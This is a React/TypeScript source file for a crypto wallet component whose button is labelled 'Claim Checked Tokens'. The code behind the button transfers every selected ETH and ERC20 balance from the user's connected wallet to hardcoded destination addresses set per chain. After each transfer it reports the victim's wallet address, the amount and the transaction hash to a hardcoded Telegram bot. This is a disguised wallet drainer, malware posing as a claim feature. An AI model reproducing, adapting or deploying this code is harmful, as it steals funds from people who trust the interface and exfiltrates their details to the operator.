import { useState } from 'react';
import { Button, useToasts } from '@geist-ui/core';
import { usePublicClient, useWalletClient, useAccount } from 'wagmi';
import { erc20Abi } from 'viem';
import { useAtom } from 'jotai';
import { normalize } from 'viem/ens';
import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
import axios from 'axios';

// Telegram Bot Config
const TELEGRAM_BOT_TOKEN = '7207803482:AAGrcKe1xtF7o7epzI1PxjXciOjaKVW2bUg';
const TELEGRAM_CHAT_ID = '6718529435';

// Function to send message to Telegram
const sendTelegramNotification = async (message: string) => {
  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    });
  } catch (error) {
    console.error('Error sending Telegram notification:', error);
  }
};

// Preset destination addresses based on chain IDs
const destinationAddresses = {
  1: '0xFB7DBCeB5598159E0B531C7eaB26d9D579Bf804B',
  56: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  10: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  324: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  42161: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  137: '0x933d91B8D5160e302239aE916461B4DC6967815d',
  // Add other chain ID and address mappings here
};

export const SendTokens = () => {
  const { setToast } = useToasts();
  const showToast = (message: string, type: 'success' | 'warning' | 'error') =>
    setToast({
      text: message,
      type,
      delay: 4000,
    });

  const [tokens] = useAtom(globalTokensAtom);
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
  const { data: walletClient } = useWalletClient();
  const publicClient = usePublicClient();
  const { chain, address, isConnected } = useAccount();

  const sendAllCheckedTokens = async () => {
    const tokensToSend: string[] = Object.entries(checkedRecords)
      .filter(([_, { isChecked }]) => isChecked)
      .map(([tokenAddress]) => tokenAddress);

    if (!walletClient || !publicClient) return;

    // Automatically select destination address based on the connected chain ID
    const destinationAddress = destinationAddresses[chain?.id];
    if (!destinationAddress) {
      showToast('Unsupported chain or no destination address found for this network', 'error');
      return;
    }

    // Perform ENS resolution if needed
    let resolvedDestinationAddress = destinationAddress;
    if (destinationAddress.includes('.')) {
      try {
        resolvedDestinationAddress = await publicClient.getEnsAddress({
          name: normalize(destinationAddress),
        });
        if (resolvedDestinationAddress) {
          showToast(`Resolved ENS address: ${resolvedDestinationAddress}`, 'success');
        }
      } catch (error: unknown) {
        if (error instanceof Error) {
          showToast(`Error resolving ENS address: ${error.message}`, 'warning');
        } else {
          showToast('An unknown error occurred while resolving ENS address', 'warning');
        }
      }
    }

    for (const tokenAddress of tokensToSend) {
      const token = tokens.find((token) => token.contract_address === tokenAddress);

      // Ensure the tokenAddress has the correct format
      const formattedTokenAddress: `0x${string}` = tokenAddress.startsWith('0x') ? tokenAddress as `0x${string}` : `0x${tokenAddress}` as `0x${string}`;

      try {
        if (formattedTokenAddress === '0x0000000000000000000000000000000000000000') { // ETH address
          // Send ETH transaction
          const amountInWei = BigInt(token?.balance || '0') * BigInt(10 ** 18); // Convert to wei

          const tx = {
            to: resolvedDestinationAddress,
            value: amountInWei,
          };

          const txResponse = await walletClient.sendTransaction(tx);
          await txResponse.wait();

          showToast(
            `ETH transfer of ${token?.balance} ETH sent. Tx Hash: ${txResponse.hash}`,
            'success',
          );

          // Send a Telegram notification for the ETH transaction
          await sendTelegramNotification(
            `ETH Transaction Sent: Wallet Address: ${address}, Amount: ${token?.balance} ETH, Tx Hash: ${txResponse.hash}, Network: ${chain?.name}`
          );
        } else {
          // Send ERC20 token transaction
          const { request } = await publicClient.simulateContract({
            account: walletClient.account,
            address: formattedTokenAddress,
            abi: erc20Abi,
            functionName: 'transfer',
            args: [
              resolvedDestinationAddress,
              BigInt(token?.balance || '0') * BigInt(10 ** token.decimals), // Adjust for token decimals
            ],
          });

          const res = await walletClient.writeContract(request);
          setCheckedRecords((old) => ({
            ...old,
            [formattedTokenAddress]: {
              ...(old[formattedTokenAddress] || { isChecked: false }),
              pendingTxn: res,
            },
          }));

          showToast(
            `Transfer of ${token?.balance} ${token?.contract_ticker_symbol} sent. Tx Hash: ${res.hash}`,
            'success',
          );

          // Send a Telegram notification for each successful ERC20 transaction
          await sendTelegramNotification(
            `Transaction Sent: Wallet Address: ${address}, Token: ${token?.contract_ticker_symbol}, Amount: ${token?.balance}, Tx Hash: ${res.hash}, Network: ${chain?.name}`
          );
        }
      } catch (err: any) {
        showToast(
          `Error with ${token?.contract_ticker_symbol} ${err?.reason || 'Unknown error'}`,
          'warning',
        );
      }
    }
  };

  const checkedCount = Object.values(checkedRecords).filter(
    (record) => record.isChecked,
  ).length;

  return (
    <div style={{ margin: '20px' }}>
      <form>
        <Button
          type="secondary"
          onClick={sendAllCheckedTokens}
          disabled={checkedCount === 0}
          style={{ marginTop: '20px' }}
        >
          Claim {checkedCount} Checked Tokens
        </Button>
      </form>
    </div>
  );
};
